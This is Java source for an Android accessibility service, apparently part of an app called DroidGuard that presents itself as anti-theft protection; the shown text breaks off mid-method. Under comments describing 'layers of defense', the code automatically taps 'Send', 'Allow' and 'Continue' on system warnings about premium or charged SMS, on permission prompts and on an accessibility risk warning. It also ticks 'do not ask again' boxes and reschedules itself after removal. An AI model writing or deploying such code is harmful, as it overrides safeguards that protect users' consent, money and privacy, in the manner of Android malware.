package com.antitheft.droidguard;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Path;
import android.graphics.Rect;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;
import androidx.core.app.NotificationCompat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;

/**
 * DroidGuard Ironclad High-Precision Security & Auto-Confirm Accessibility Service
 * 
 * 7-LAYER DEFENSE IN DEPTH:
 * 1. ZERO INTERFERENCE BLACKLIST: Instant early-exit on all messaging, social, banking, browser, and media apps.
 * 2. INPUT METHOD ISOLATION: Immune to virtual keyboards, IME editors, and text fields.
 * 3. SETTINGS APP SHIELD: Settings app is restricted only to verified ColorOS/MIUI/HyperOS security count-down modals.
 * 4. SYSTEM PACKAGE WHITELIST: Strict containment to verified OEM security frameworks and telephony.
 * 5. IRREVERSIBLE NEGATIVE FILTER: Absolute rejection of any node containing disable/cancel/deny/stop commands.
 * 6. MODAL & INTENT VALIDATION: Confirms authentic OS warning dialogues before evaluating positive buttons.
 * 7. FAIL-SAFE SMART CLICK ENGINE: Direct -> Parent -> Gesture tap with automatic node recycling to prevent memory leaks.
 */
public class AutoConfirmService extends AccessibilityService {
    private static final String TAG = "DroidGuard-AutoConfirm";
    public static volatile AutoConfirmService instance = null;

    private static final String PREFS_NAME = "droidguard_security_prefs";
    private static final String KEY_EMERGENCY_ARMED_UNTIL = "emergency_armed_until";
    public static final String ACTION_ARM_EMERGENCY = "com.antitheft.droidguard.ACTION_ARM_EMERGENCY";
    public static final String ACTION_OPEN_POWER_MENU = "com.antitheft.droidguard.ACTION_OPEN_POWER_MENU";

    private static final AtomicLong emergencyArmedUntilMemory = new AtomicLong(0L);
    private static final AtomicLong lastActionTimestamp = new AtomicLong(0L);
    private static final long ACTION_DEBOUNCE_MS = 250L;

    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final AtomicBoolean isColorOsWatcherRunning = new AtomicBoolean(false);
    private final AtomicBoolean isSmsWatcherRunning = new AtomicBoolean(false);
    private final AtomicInteger consecutiveNotFoundCount = new AtomicInteger(0);

    // LAYER 1: STRICT BLACKLIST - USER & SENSITIVE APPS ARE NEVER TOUCHED
    private static final Set<String> USER_APPS_BLACKLIST;
    static {
        Set<String> set = new HashSet<>();
        // Social & Messaging
        set.add("com.facebook.orca");
        set.add("com.facebook.katana");
        set.add("com.facebook.lite");
        set.add("com.facebook.mlite");
        set.add("com.whatsapp");
        set.add("com.whatsapp.w4b");
        set.add("org.telegram.messenger");
        set.add("org.thunderdog.challegram");
        set.add("com.instagram.android");
        set.add("com.zhiliaoapp.musically");
        set.add("com.ss.android.ugc.trill");
        set.add("com.ss.android.ugc.aweme");
        set.add("com.ss.android.ugc.live");
        set.add("com.tiktok.studio");
        set.add("com.bytedance");
        set.add("com.google.android.talk");
        set.add("com.google.android.gm");
        set.add("com.viber.voip");
        set.add("com.snapchat.android");
        set.add("com.twitter.android");
        set.add("com.discord");
        set.add("com.imo.android.imoim");
        set.add("com.skype.raider");
        set.add("com.tencent.mm");
        set.add("com.linecorp.line");
        set.add("com.truecaller");
        // Browsers & Payment
        set.add("com.android.chrome");
        set.add("org.mozilla.firefox");
        set.add("com.opera.browser");
        set.add("com.microsoft.emmx");
        set.add("com.google.android.apps.walletnfcrel");
        set.add("com.paypal.android.p2pmobile");
        set.add("com.binance.dev");
        USER_APPS_BLACKLIST = Collections.unmodifiableSet(set);
    }

    // LAYER 4: STRICT WHITELIST - SYSTEM SECURITY, PERMISSIONS & TELEPHONY PACKAGES
    private static final String[] SYSTEM_SECURITY_PACKAGES = new String[] {
        "android",
        "com.android.systemui",
        "com.android.permissioncontroller",
        "com.google.android.permissioncontroller",
        "com.android.packageinstaller",
        "com.samsung.android.permissioncontroller",
        "com.miui.securitycenter",
        "com.miui.securityadd",
        "com.lbe.security.miui",
        "com.miui.powerkeeper",
        "com.android.phone",
        "com.android.server.telecom",
        "com.oplus.securitypermission",
        "com.coloros.securitypermission",
        "com.oplus.safecenter",
        "com.coloros.safecenter",
        "com.nearme.safecenter",
        "com.oppo.safecenter",
        "com.realme.safecenter",
        "com.coloros.securityguard",
        "com.vivo.permissionmanager",
        "com.iqoo.secure",
        "com.transsion.phonemanager",
        "com.transsion.security",
        "com.huawei.systemmanager",
        "com.honor.systemmanager",
        "com.antitheft.droidguard"
    };

    // Strict unambiguous system SMS modal phrases (OEM & AOSP variants)
    private static final String[] SMS_SYSTEM_WARNING_PHRASES = new String[] {
        "سيرسل رسالة sms",
        "سيرسل رسالة قصيرة",
        "سيرسل رسالة",
        "تطبيق حماية الهاتف",
        "حماية الهاتف",
        "droidguard",
        "يرسل رسالة sms",
        "يرسل رسالة",
        "رسالة sms",
        "رسائل sms",
        "قد تتسبب في فرض رسوم",
        "قد يؤدي هذا إلى فرض رسوم",
        "فرض رسوم على فاتورة الجوال",
        "رسوم مشغل شبكة الجوال",
        "محاولة إرسال رسالة قصيرة",
        "souhaite envoyer un sms",
        "peut entraîner des frais",
        "des frais peuvent s'appliquer",
        "frais sur votre facture",
        "sms surtaxé",
        "would like to send an sms",
        "would like to send a message",
        "charges may apply",
        "carrier charges may apply",
        "send premium sms",
        "is attempting to send an sms"
    };

    // LAYER 5: STRICT DANGEROUS/NEGATIVE WORDS - NEVER CLICK ANY BUTTON WITH THESE
    private static final String[] DANGEROUS_NEGATIVE_WORDS = new String[] {
        "إيقاف تشغيل إمكانية الوصول",
        "ايقاف تشغيل امكانية الوصول",
        "إيقاف تشغيل",
        "ايقاف تشغيل",
        "إيقاف",
        "ايقاف",
        "تعطيل",
        "إلغاء",
        "الغاء",
        "رفض",
        "عدم السماح",
        "لا تسمح",
        "حظر",
        "disable",
        "turn off",
        "turn-off",
        "shut down",
        "stop",
        "cancel",
        "deny",
        "don't allow",
        "dont allow",
        "block",
        "refuser",
        "annuler",
        "désactiver",
        "desactiver",
        "bloquer"
    };

    // Known positive button View IDs in OEM system dialogs
    private static final String[] POSITIVE_VIEW_IDS = new String[] {
        "android:id/button1",
        "android:id/button2",
        "android:id/button_positive",
        "android:id/ok",
        "android:id/button_yes",
        "com.android.mms:id/send_btn",
        "com.android.mms:id/send_button",
        "com.android.mms:id/button1",
        "com.android.mms.service:id/send_btn",
        "com.google.android.apps.messaging:id/send_message_button",
        "com.android.permissioncontroller:id/permission_allow_button",
        "com.android.permissioncontroller:id/permission_allow_always_button",
        "com.google.android.permissioncontroller:id/permission_allow_button",
        "com.google.android.permissioncontroller:id/permission_allow_always_button",
        "com.android.packageinstaller:id/permission_allow_button",
        "com.samsung.android.permissioncontroller:id/permission_allow_button",
        "com.samsung.android.permissioncontroller:id/permission_allow_always_button",
        "com.miui.securitycenter:id/accept",
        "com.miui.securitycenter:id/btn_allow",
        "com.miui.securitycenter:id/positive_btn",
        "com.miui.securitycenter:id/ok",
        "com.miui.securitycenter:id/intercept_btn_allow",
        "com.miui.securitycenter:id/send_btn",
        "com.miui.securitycenter:id/button1",
        "com.miui.securitycenter:id/button2",
        "com.miui.securityadd:id/button1",
        "com.android.phone:id/button1",
        "com.android.phone:id/button2",
        "com.android.phone:id/positive_button",
        "com.oplus.safecenter:id/btn_continue",
        "com.coloros.safecenter:id/btn_continue",
        "com.oplus.securitypermission:id/permission_allow_button",
        "com.coloros.securitypermission:id/permission_allow_button",
        "com.oplus.securitypermission:id/btn_allow",
        "com.coloros.securitypermission:id/btn_allow",
        "com.oplus.securitypermission:id/button1",
        "com.coloros.securitypermission:id/button1"
    };

    // Explicit Positive Button Phrases (Multi-lingual)
    private static final String[] POSITIVE_BUTTON_TEXTS = new String[] {
        "إرسال",
        "ارسال",
        "إرسال على أي حال",
        "ارسال على اي حال",
        "السماح",
        "سماح",
        "السماح دائماً",
        "السماح دائما",
        "سماح دائماً",
        "سماح دائما",
        "استمرار التشغيل",
        "استمرار",
        "موافق",
        "نعم",
        "envoyer",
        "envoyer quand même",
        "autoriser",
        "toujours autoriser",
        "continuer",
        "oui",
        "send",
        "send anyway",
        "allow",
        "always allow",
        "allow all the time",
        "continue",
        "keep on",
        "keep using",
        "yes",
        "ok"
    };

    // Checkbox IDs for "Remember my choice" / "Do not ask again"
    private static final String[] CHECKBOX_VIEW_IDS = new String[] {
        "com.android.permissioncontroller:id/do_not_ask_again_checkbox",
        "com.google.android.permissioncontroller:id/do_not_ask_again_checkbox",
        "com.samsung.android.permissioncontroller:id/do_not_ask_again_checkbox",
        "com.samsung.android.messaging:id/remember_choice",
        "com.miui.securitycenter:id/remember",
        "com.miui.securitycenter:id/remember_choice",
        "com.oplus.safecenter:id/checkbox",
        "com.coloros.safecenter:id/checkbox"
    };

    public static void armEmergencyAutoConfirm(Context context, long durationMs) {
        long until = System.currentTimeMillis() + durationMs;
        emergencyArmedUntilMemory.set(until);
        try {
            if (context != null) {
                SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                prefs.edit().putLong(KEY_EMERGENCY_ARMED_UNTIL, until).apply();
            }
        } catch (Exception ignored) {}

        // Pre-activate SMS watcher immediately so it watches for modal dialogs as soon as dispatch starts
        if (instance != null) {
            instance.startSmsConfirmWatcher();
        } else if (context != null) {
            try {
                Intent intent = new Intent(context, AutoConfirmService.class);
                intent.setAction(ACTION_ARM_EMERGENCY);
                intent.putExtra("duration", durationMs);
                context.startService(intent);
            } catch (Exception ignored) {}
        }
    }

    public static void armEmergencyWindow(Context context, long durationMs) {
        armEmergencyAutoConfirm(context, durationMs);
    }

    public static boolean isEmergencyWindowActive(Context context) {
        long now = System.currentTimeMillis();
        if (emergencyArmedUntilMemory.get() > now) {
            return true;
        }
        try {
            if (context != null) {
                SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
                long stored = prefs.getLong(KEY_EMERGENCY_ARMED_UNTIL, 0L);
                return stored > now;
            }
        } catch (Exception ignored) {}
        return false;
    }

    private static final String CHANNEL_ID = "droidguard_bg_protection_channel";
    private static final int NOTIFICATION_ID = 9911;

    private void ensureForegroundNotification() {
        try {
            NotificationManager nm = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
            if (nm == null) return;

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    getString(R.string.bg_service_channel_name),
                    NotificationManager.IMPORTANCE_LOW
                );
                channel.setDescription(getString(R.string.bg_service_channel_desc));
                channel.setShowBadge(false);
                channel.setSound(null, null);
                nm.createNotificationChannel(channel);
            }

            Intent launchIntent = getPackageManager().getLaunchIntentForPackage(getPackageName());
            PendingIntent pendingIntent = null;
            if (launchIntent != null) {
                int flags = PendingIntent.FLAG_UPDATE_CURRENT;
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    flags |= PendingIntent.FLAG_IMMUTABLE;
                }
                pendingIntent = PendingIntent.getActivity(this, 0, launchIntent, flags);
            }

            Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(getString(R.string.bg_service_notification_title))
                .setContentText(getString(R.string.bg_service_notification_text))
                .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .setContentIntent(pendingIntent)
                .build();

            startForeground(NOTIFICATION_ID, notification);
            Log.i(TAG, "🛡️ AutoConfirmService promoted to Foreground Service with persistent notification.");
        } catch (Throwable t) {
            Log.w(TAG, "Failed to startForeground: " + t.getMessage());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        ensureForegroundNotification();
        if (intent != null) {
            String action = intent.getAction();
            if (ACTION_ARM_EMERGENCY.equals(action)) {
                long duration = intent.getLongExtra("duration", 60_000L);
                long until = System.currentTimeMillis() + duration;
                emergencyArmedUntilMemory.set(until);
                Log.i(TAG, "🚨 onStartCommand: emergency auto-confirm armed until: " + until);
                startSmsConfirmWatcher();
            } else if (ACTION_OPEN_POWER_MENU.equals(action)) {
                try {
                    performGlobalAction(GLOBAL_ACTION_POWER_DIALOG);
                    Log.i(TAG, "⚡ onStartCommand: performed GLOBAL_ACTION_POWER_DIALOG");
                } catch (Throwable t) {
                    Log.w(TAG, "Failed to perform GLOBAL_ACTION_POWER_DIALOG: " + t.getMessage());
                }
            }
        }
        return START_STICKY;
    }

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        ensureForegroundNotification();
        Log.i(TAG, "✅ AutoConfirmService connected & fortified with 7-layer defense.");
    }

    @Override
    public void onDestroy() {
        if (instance == this) instance = null;
        isColorOsWatcherRunning.set(false);
        isSmsWatcherRunning.set(false);
        super.onDestroy();
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        try {
            Intent restartServiceIntent = new Intent(getApplicationContext(), AutoConfirmService.class);
            restartServiceIntent.setPackage(getPackageName());
            PendingIntent restartIntent = PendingIntent.getService(
                getApplicationContext(), 1, restartServiceIntent,
                PendingIntent.FLAG_ONE_SHOT | (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ? PendingIntent.FLAG_IMMUTABLE : 0)
            );
            android.app.AlarmManager alarmManager = (android.app.AlarmManager) getSystemService(Context.ALARM_SERVICE);
            if (alarmManager != null) {
                alarmManager.set(
                    android.app.AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    android.os.SystemClock.elapsedRealtime() + 500,
                    restartIntent
                );
            }
            Log.i(TAG, "🔄 onTaskRemoved: Scheduled AutoConfirmService persistence restart.");
        } catch (Exception e) {
            Log.w(TAG, "Failed to schedule service restart onTaskRemoved: " + e.getMessage());
        }
    }

    public static boolean openNativePowerMenu(Context ctx) {
        if (instance != null) {
            try {
                return instance.performGlobalAction(GLOBAL_ACTION_POWER_DIALOG);
            } catch (Throwable ignored) {}
        }
        try {
            if (ctx != null) {
                Intent intent = new Intent(ctx, AutoConfirmService.class);
                intent.setAction(ACTION_OPEN_POWER_MENU);
                ctx.startService(intent);
                return true;
            }
        } catch (Throwable ignored) {}
        return false;
    }

    private static void safeRecycle(AccessibilityNodeInfo node) {
        if (node != null) {
            try {
                node.recycle();
            } catch (Throwable ignored) {}
        }
    }

    private static void safeRecycleList(List<AccessibilityNodeInfo> list) {
        if (list != null) {
            for (AccessibilityNodeInfo node : list) {
                safeRecycle(node);
            }
            list.clear();
        }
    }

    private boolean containsDangerousWord(String text) {
        if (text == null || text.trim().isEmpty()) return false;
        String clean = text.toLowerCase(Locale.ROOT).trim();
        for (String bad : DANGEROUS_NEGATIVE_WORDS) {
            if (clean.contains(bad)) {
                return true;
            }
        }
        return false;
    }

    private boolean isDangerousNode(AccessibilityNodeInfo node) {
        if (node == null) return false;
        try {
            CharSequence text = node.getText();
            if (text != null && containsDangerousWord(text.toString())) {
                return true;
            }
            CharSequence desc = node.getContentDescription();
            if (desc != null && containsDangerousWord(desc.toString())) {
                return true;
            }
            int count = node.getChildCount();
            for (int i = 0; i < count; i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    try {
                        CharSequence cText = child.getText();
                        if (cText != null && containsDangerousWord(cText.toString())) {
                            return true;
                        }
                    } finally {
                        safeRecycle(child);
                    }
                }
            }
        } catch (Throwable ignored) {}
        return false;
    }

    /**
     * Checks whether the current dialog is the ColorOS / Realme Accessibility Security Warning.
     */
    private boolean isAccessibilitySecurityDialog(AccessibilityNodeInfo root) {
        if (root == null) return false;
        try {
            List<AccessibilityNodeInfo> warningHeaders = root.findAccessibilityNodeInfosByText("أمانك المالي");
            if (warningHeaders != null && !warningHeaders.isEmpty()) {
                safeRecycleList(warningHeaders);
                return true;
            }
            safeRecycleList(warningHeaders);

            List<AccessibilityNodeInfo> riskNodes = root.findAccessibilityNodeInfosByText("خطرا على خصوصيتك");
            if (riskNodes != null && !riskNodes.isEmpty()) {
                safeRecycleList(riskNodes);
                return true;
            }
            safeRecycleList(riskNodes);

            List<AccessibilityNodeInfo> riskNodes2 = root.findAccessibilityNodeInfosByText("خطرًا على خصوصيتك");
            if (riskNodes2 != null && !riskNodes2.isEmpty()) {
                safeRecycleList(riskNodes2);
                return true;
            }
            safeRecycleList(riskNodes2);

            List<AccessibilityNodeInfo> keepNodes = root.findAccessibilityNodeInfosByText("استمرار التشغيل");
            if (keepNodes != null && !keepNodes.isEmpty()) {
                safeRecycleList(keepNodes);
                return true;
            }
            safeRecycleList(keepNodes);
        } catch (Throwable ignored) {}
        return false;
    }

    /**
     * Handles ColorOS / Realme Accessibility Warning Dialog safely.
     */
    private boolean handleAccessibilitySecurityDialog(AccessibilityNodeInfo root) {
        if (root == null) return false;

        AccessibilityNodeInfo continueBtn = null;
        List<AccessibilityNodeInfo> byId = null;
        try {
            byId = root.findAccessibilityNodeInfosByViewId("com.oplus.safecenter:id/btn_continue");
            if (byId != null && !byId.isEmpty()) {
                continueBtn = byId.get(0);
            }
        } catch (Throwable ignored) {
        } finally {
            if (byId != null && byId.size() > 1) {
                for (int i = 1; i < byId.size(); i++) safeRecycle(byId.get(i));
            }
        }

        if (continueBtn == null) {
            List<AccessibilityNodeInfo> byText = null;
            try {
                byText = root.findAccessibilityNodeInfosByText("استمرار التشغيل");
                if (byText != null && !byText.isEmpty()) {
                    for (AccessibilityNodeInfo n : byText) {
                        if (!isDangerousNode(n)) {
                            continueBtn = n;
                            break;
                        }
                    }
                }
            } catch (Throwable ignored) {
            } finally {
                if (byText != null) {
                    for (AccessibilityNodeInfo n : byText) {
                        if (n != continueBtn) safeRecycle(n);
                    }
                }
            }
        }

        if (continueBtn != null) {
            try {
                if (continueBtn.isEnabled()) {
                    boolean clicked = performSmartClick(continueBtn);
                    if (clicked) {
                        Log.i(TAG, "🎉 Successfully confirmed 'استمرار التشغيل'!");
                        isColorOsWatcherRunning.set(false);
                        return true;
                    }
                }
            } finally {
                safeRecycle(continueBtn);
            }
        }

        startColorOsContinueWatcher();
        return true;
    }

    /**
     * Active Polling Watcher for ColorOS countdown dialog.
     */
    private void startColorOsContinueWatcher() {
        if (!isColorOsWatcherRunning.compareAndSet(false, true)) return;

        final long startTime = SystemClock.uptimeMillis();
        final long MAX_WATCH_TIME_MS = 15000L;

        final Runnable watchRunnable = new Runnable() {
            @Override
            public void run() {
                if (!isColorOsWatcherRunning.get()) return;

                long elapsed = SystemClock.uptimeMillis() - startTime;
                if (elapsed > MAX_WATCH_TIME_MS) {
                    isColorOsWatcherRunning.set(false);
                    return;
                }

                AccessibilityNodeInfo root = null;
                try {
                    root = findBestRootNode(null);
                    if (root != null) {
                        if (!isAccessibilitySecurityDialog(root)) {
                            // Give brief leeway before giving up immediately
                            if (elapsed > 1500L) {
                                isColorOsWatcherRunning.set(false);
                                return;
                            }
                        } else {
                            AccessibilityNodeInfo btn = findContinueButton(root);
                            if (btn != null) {
                                try {
                                    if (btn.isEnabled() && !isDangerousNode(btn)) {
                                        boolean clicked = performSmartClick(btn);
                                        if (clicked) {
                                            Log.i(TAG, "🎯 Watcher successfully confirmed 'استمرار التشغيل'!");
                                            isColorOsWatcherRunning.set(false);
                                            return;
                                        }
                                    }
                                } finally {
                                    safeRecycle(btn);
                                }
                            }
                        }
                    }
                } catch (Throwable ignored) {
                } finally {
                    safeRecycle(root);
                }

                if (isColorOsWatcherRunning.get()) {
                    mainHandler.postDelayed(this, 200L);
                }
            }
        };

        mainHandler.post(watchRunnable);
    }

    private AccessibilityNodeInfo findContinueButton(AccessibilityNodeInfo root) {
        if (root == null) return null;
        String[] ids = new String[] {
            "com.oplus.safecenter:id/btn_continue",
            "com.coloros.safecenter:id/btn_continue",
            "android:id/button1"
        };
        for (String id : ids) {
            List<AccessibilityNodeInfo> list = null;
            try {
                list = root.findAccessibilityNodeInfosByViewId(id);
                if (list != null && !list.isEmpty()) {
                    AccessibilityNodeInfo found = list.get(0);
                    for (int i = 1; i < list.size(); i++) safeRecycle(list.get(i));
                    return found;
                }
            } catch (Throwable ignored) {
            } finally {
                safeRecycleList(list);
            }
        }
        List<AccessibilityNodeInfo> textList = null;
        try {
            textList = root.findAccessibilityNodeInfosByText("استمرار التشغيل");
            if (textList == null || textList.isEmpty()) {
                textList = root.findAccessibilityNodeInfosByText("استمرار");
            }
            if (textList != null && !textList.isEmpty()) {
                for (AccessibilityNodeInfo n : textList) {
                    if (!isDangerousNode(n)) {
                        return n;
                    }
                }
            }
        } catch (Throwable ignored) {
        } finally {
            safeRecycleList(textList);
        }
        return null;
    }

    /**
     * Active Polling Watcher for SMS confirmation countdown dialogs.
     * Continuously runs and clicks the positive button throughout the countdown (e.g. 7s timer)
     * until the system dialog is dismissed.
     */
    private void startSmsConfirmWatcher() {
        if (!isSmsWatcherRunning.compareAndSet(false, true)) {
            consecutiveNotFoundCount.set(0);
            return;
        }
        consecutiveNotFoundCount.set(0);

        final long startTime = SystemClock.uptimeMillis();
        final long MAX_SMS_WATCH_TIME_MS = 25000L; // 25s covers maximum OEM countdowns + latency

        final Runnable smsRunnable = new Runnable() {
            @Override
            public void run() {
                if (!isSmsWatcherRunning.get()) return;

                long elapsed = SystemClock.uptimeMillis() - startTime;
                if (elapsed > MAX_SMS_WATCH_TIME_MS) {
                    Log.i(TAG, "SMS Watcher timeout reached (25s). Stopping watcher.");
                    isSmsWatcherRunning.set(false);
                    return;
                }

                AccessibilityNodeInfo root = null;
                try {
                    root = findSmsDialogCandidate(null);
                    if (root != null && checkIsSmsDialog(root)) {
                        consecutiveNotFoundCount.set(0);

                        // 1. Auto-check "Remember my choice" / "عدم السؤال مرة أخرى"
                        autoCheckRememberChoice(root);

                        // 2. Click positive button (keeps tapping throughout countdown)
                        AccessibilityNodeInfo positiveBtn = findSmsPositiveButton(root);
                        if (positiveBtn != null) {
                            try {
                                if (!isDangerousNode(positiveBtn)) {
                                    performSmartClick(positiveBtn);
                                }
                            } finally {
                                safeRecycle(positiveBtn);
                            }
                        }
                    } else {
                        int missing = consecutiveNotFoundCount.incrementAndGet();
                        // Only declare dismissed if missing for at least 6 consecutive ticks (~1.2s)
                        // AND at least 1.5 seconds have elapsed since watcher start
                        if (missing >= 6 && elapsed > 1500L) {
                            Log.i(TAG, "🎯 [SMS Watcher] Dialog dismissed! Confirmed SMS dispatched.");
                            isSmsWatcherRunning.set(false);
                            return;
                        }
                    }
                } catch (Throwable t) {
                    Log.w(TAG, "Error in SMS watcher tick: " + t.getMessage());
                } finally {
                    safeRecycle(root);
                }

                if (isSmsWatcherRunning.get()) {
                    mainHandler.postDelayed(this, 200L);
                }
            }
        };

        mainHandler.post(smsRunnable);
    }

    /**
     * Dedicated candidate finder that searches active window, event source,
     * and ALL system/application windows to locate any SMS confirmation dialog.
     */
    private AccessibilityNodeInfo findSmsDialogCandidate(AccessibilityEvent event) {
        // 1. Check root in active window
        AccessibilityNodeInfo active = null;
        try {
            active = getRootInActiveWindow();
            if (active != null && checkIsSmsDialog(active)) {
                return active;
            }
        } catch (Throwable ignored) {}

        // 2. Check event source
        if (event != null) {
            try {
                AccessibilityNodeInfo src = event.getSource();
                if (src != null) {
                    if (checkIsSmsDialog(src)) {
                        safeRecycle(active);
                        return src;
                    }
                    safeRecycle(src);
                }
            } catch (Throwable ignored) {}
        }

        // 3. Scan all interactive windows across the system
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                List<AccessibilityWindowInfo> windows = getWindows();
                if (windows != null) {
                    for (AccessibilityWindowInfo win : windows) {
                        if (win == null) continue;
                        AccessibilityNodeInfo winRoot = null;
                        try {
                            winRoot = win.getRoot();
                            if (winRoot != null && checkIsSmsDialog(winRoot)) {
                                safeRecycle(active);
                                return winRoot;
                            }
                        } catch (Throwable ignored) {
                        } finally {
                            if (winRoot != null && winRoot != active) {
                                safeRecycle(winRoot);
                            }
                        }
                    }
                }
            } catch (Throwable ignored) {}
        }

        return active;
    }

    /**
     * Multi-tier algorithm to find the root node
     */
    private AccessibilityNodeInfo findBestRootNode(AccessibilityEvent event) {
        AccessibilityNodeInfo root = null;
        try {
            root = getRootInActiveWindow();
        } catch (Throwable ignored) {}
        if (root != null) return root;

        if (event != null) {
            try {
                root = event.getSource();
            } catch (Throwable ignored) {}
            if (root != null) return root;
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                List<AccessibilityWindowInfo> windows = getWindows();
                if (windows != null) {
                    for (AccessibilityWindowInfo win : windows) {
                        if (win != null && (win.getType() == AccessibilityWindowInfo.TYPE_APPLICATION || 
                                             win.getType() == AccessibilityWindowInfo.TYPE_SYSTEM)) {
                            AccessibilityNodeInfo winRoot = win.getRoot();
                            if (winRoot != null) return winRoot;
                        }
                    }
                }
            } catch (Throwable ignored) {}
        }
        return null;
    }

    /**
     * Rigorous check for a system SMS confirmation modal dialog:
     * 1. Must contain an exact system warning phrase (e.g. "سيرسل رسالة SMS" or "قد يؤدي هذا إلى فرض رسوم").
     * 2. Must contain an explicit cancel/deny button ("إلغاء" / "رفض" / "Cancel" / "Deny") OR positive button.
     */
    private boolean checkIsSmsDialog(AccessibilityNodeInfo root) {
        if (root == null) return false;
        try {
            // Step 1: Check warning phrases
            boolean hasWarningPhrase = false;
            for (String phrase : SMS_SYSTEM_WARNING_PHRASES) {
                List<AccessibilityNodeInfo> nodes = null;
                try {
                    nodes = root.findAccessibilityNodeInfosByText(phrase);
                    if (nodes != null && !nodes.isEmpty()) {
                        hasWarningPhrase = true;
                        break;
                    }
                } catch (Throwable ignored) {
                } finally {
                    safeRecycleList(nodes);
                }
            }

            if (!hasWarningPhrase) {
                // Fallback: Tree text scan for key combination (سيرسل/رسالة/sms/رسوم)
                hasWarningPhrase = scanTreeForSmsWarning(root);
            }

            if (!hasWarningPhrase) return false;

            // Step 2: Confirmation dialogs have buttons (Cancel / Deny / Send / Allow)
            boolean hasActionButtons = false;
            String[] actionWords = new String[] { "إلغاء", "الغاء", "رفض", "cancel", "deny", "annuler", "إرسال", "ارسال", "send", "allow", "سماح" };
            for (String aWord : actionWords) {
                List<AccessibilityNodeInfo> cNodes = null;
                try {
                    cNodes = root.findAccessibilityNodeInfosByText(aWord);
                    if (cNodes != null && !cNodes.isEmpty()) {
                        hasActionButtons = true;
                        break;
                    }
                } catch (Throwable ignored) {
                } finally {
                    safeRecycleList(cNodes);
                }
            }

            if (!hasActionButtons) {
                // Check if any positive view ID exists in tree
                for (String vid : POSITIVE_VIEW_IDS) {
                    List<AccessibilityNodeInfo> vNodes = null;
                    try {
                        vNodes = root.findAccessibilityNodeInfosByViewId(vid);
                        if (vNodes != null && !vNodes.isEmpty()) {
                            hasActionButtons = true;
                            break;
                        }
                    } catch (Throwable ignored) {
                    } finally {
                        safeRecycleList(vNodes);
                    }
                }
            }

            return hasActionButtons;

        } catch (Throwable ignored) {}
        return false;
    }

    private boolean scanTreeForSmsWarning(AccessibilityNodeInfo node) {
        if (node == null) return false;
        try {
            CharSequence text = node.getText();
            CharSequence desc = node.getContentDescription();
            String full = ((text != null ? text.toString() : "") + " " + (desc != null ? desc.toString() : "")).toLowerCase(Locale.ROOT);
            for (String phrase : SMS_SYSTEM_WARNING_PHRASES) {
                if (full.contains(phrase)) return true;
            }
            if (full.contains("رسالة") && (full.contains("سيرسل") || full.contains("sms") || full.contains("رسوم"))) {
                return true;
            }

            int count = node.getChildCount();
            for (int i = 0; i < count; i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    boolean found = scanTreeForSmsWarning(child);
                    safeRecycle(child);
                    if (found) return true;
                }
            }
        } catch (Throwable ignored) {}
        return false;
    }

    /**
     * Locates the positive confirmation button (Send / إرسال / السماح / Allow).
     */
    private AccessibilityNodeInfo findSmsPositiveButton(AccessibilityNodeInfo root) {
        if (root == null) return null;

        // Tier 1: Known View IDs (e.g. android:id/button1, com.miui.securitycenter:id/accept, send_btn)
        for (String viewId : POSITIVE_VIEW_IDS) {
            List<AccessibilityNodeInfo> list = null;
            try {
                list = root.findAccessibilityNodeInfosByViewId(viewId);
                if (list != null && !list.isEmpty()) {
                    for (AccessibilityNodeInfo node : list) {
                        if (node != null && !isDangerousNode(node)) {
                            for (AccessibilityNodeInfo other : list) {
                                if (other != node) safeRecycle(other);
                            }
                            return node;
                        }
                    }
                }
            } catch (Throwable ignored) {
            } finally {
                safeRecycleList(list);
            }
        }

        // Tier 2: Search by explicit text matches ("إرسال", "ارسال", "السماح", "Send", "Allow")
        for (String positiveText : POSITIVE_BUTTON_TEXTS) {
            List<AccessibilityNodeInfo> list = null;
            try {
                list = root.findAccessibilityNodeInfosByText(positiveText);
                if (list != null && !list.isEmpty()) {
                    for (AccessibilityNodeInfo node : list) {
                        if (node != null && !isDangerousNode(node)) {
                            for (AccessibilityNodeInfo other : list) {
                                if (other != node) safeRecycle(other);
                            }
                            return node;
                        }
                    }
                }
            } catch (Throwable ignored) {
            } finally {
                safeRecycleList(list);
            }
        }

        // Tier 3: Scan tree for explicit send button text only
        return scanTreeForPositiveButton(root);
    }

    private AccessibilityNodeInfo scanTreeForPositiveButton(AccessibilityNodeInfo node) {
        if (node == null) return null;
        try {
            if (!isDangerousNode(node)) {
                CharSequence text = node.getText();
                CharSequence desc = node.getContentDescription();
